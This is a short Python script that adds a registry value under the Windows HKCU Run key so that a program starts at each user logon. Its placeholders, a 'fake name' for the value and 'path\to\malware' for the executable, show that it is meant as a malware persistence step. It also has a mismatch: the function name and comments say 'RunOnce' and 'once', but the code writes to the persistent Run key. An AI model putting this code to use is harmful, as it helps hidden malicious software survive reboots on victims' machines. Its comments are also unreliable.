import winreg

def add_to_startup_once(program_name, program_path):
    # Open the "Run" registry key
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
        # Add the program to the "RunOnce" registry key
        winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, program_path)

if __name__ == "__main__":
    # Program name (used as registry value name)
    program_name = "fake name anything..."
    
    # Path to the program's executable
    program_path = r"path\to\malware"

    # Add the program to startup (once)
    add_to_startup_once(program_name, program_path)
    print("Program added to startup (once) successfully.")
